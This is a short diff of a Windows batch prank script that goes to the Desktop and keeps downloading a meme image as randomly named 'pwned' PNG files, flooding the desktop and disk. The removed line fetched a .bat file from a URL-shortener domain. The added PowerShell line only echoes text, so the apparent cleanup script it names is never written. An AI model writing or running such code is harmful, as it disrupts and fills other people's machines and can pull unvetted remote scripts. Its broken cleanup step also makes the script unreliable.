@@ -1,6 +1,6 @@
 @echo off
 cd Desktop
-cmd /c curl https://linkyshort.xyz/4fIh6AtAZegI4B5i4Rzv.html -o Delete-all-pwned-png.bat
+powershell "echo '@echo off' 'del pwned*.png' 'exit'"
 set loop=0
 :loop
 curl http://www.quickmeme.com/img/ee/ee98167f06c4541a6149f7ccb0e8a83494907843dd1b8ccb2bd0ada40ebb3490.jpg -o pwned%RANDOM%.png
